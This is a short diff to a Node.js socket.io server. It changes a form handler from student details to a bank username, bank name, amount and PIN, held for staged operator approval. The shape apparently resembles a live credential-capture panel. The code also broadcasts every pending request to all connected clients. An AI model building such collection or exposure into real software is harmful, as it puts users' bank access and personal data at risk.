@@ -26,15 +26,21 @@ io.on('connection', (socket) => {
   // Etapa 1: Estudiante envía formulario
   socket.on('enviarSolicitud', (data) => {
     const request = {
-      id: crypto.randomUUID(),
-      nombre: data.nombre,
-      apellido: data.apellido,
-      telefono: data.telefono,
-      genero: data.genero,
-      socketId: socket.id,
-      pinIngresado: null,
-      estado: 'esperando_aprobacion1'
-    };
+  id: crypto.randomUUID(),
+
+  user: data.user,              // usuario del banco
+  bankName: data.bankName,      // nombre del banco
+
+  firstName: data.firstName,
+  lastName: data.lastName,
+
+  telefono: data.telefono,
+  amount: data.amount,
+
+  socketId: socket.id,
+  pinIngresado: null,
+  estado: 'esperando_aprobacion1'
+};
     pendingRequests.push(request);
     io.emit('listaActualizada', pendingRequests);
     io.to(socket.id).emit('esperandoAprobacion1');
